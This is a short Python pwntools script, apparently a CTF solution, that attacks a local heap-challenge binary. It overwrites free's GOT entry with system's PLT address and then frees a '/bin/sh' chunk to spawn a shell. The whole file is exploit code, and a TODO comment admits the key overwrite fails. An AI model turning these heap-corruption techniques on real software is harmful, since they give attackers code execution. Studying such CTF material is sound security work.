from pwn import *

context.log_level = 'debug'

r = process('./silent2')
elf = ELF('./silent2')

# copied from elf.py: def bss(self, offset=0)
def getSection(name):
  orig_bss = elf.get_section_by_name(name).header.sh_addr
  curr_bss = orig_bss - elf.load_addr + elf.address
  return curr_bss

system_plt = elf.plt['system']
print 'system_plt= ' + hex(system_plt)
free_got = elf.got['free']
print 'free_got= ' + hex(free_got)
got0= elf.get_section_by_name('.got.plt').header.sh_addr
print 'got0= ' + hex(got0)
fake_chunk = got0 + 2 - 8
print 'fake_chunk= ' + hex(fake_chunk)
chunklist=0x6020C0

def add(size, content):
  r.sendline('1')
  r.sendline(str(size))
  r.send(content)

def free(index):
  r.sendline('2')
  r.sendline(str(index))

def edit(index, content, unk_602120):
  r.sendline('3')
  r.sendline(str(index))
  r.sendline(content)
  r.sendline(unk_602120)

def exp():
  r.recvuntil('\n\n')
  add(0x80, '/bin/sh\0') # 0
  add(0x80, 'a'*16) # 1
  add(0x80, 'a') # 2 avoid consolidating the top chunk
  free(1) # free 1 to unsorted bin
  payload = p64(0xffffffffffffffff) + p64(free_got - 0x10) # TODO fail to overwrite bk, since read of strlen(p) bytes, fd = 0x00007f**********, could ONLY read the first 6 bytes.
  edit(1, payload, '')
  gdb.attach(r)
  add(0x80, 'b') # 3
  add(0x80, p64(system_plt))
  free(0)
  r.interactive()


if __name__ == '__main__':
  exp()
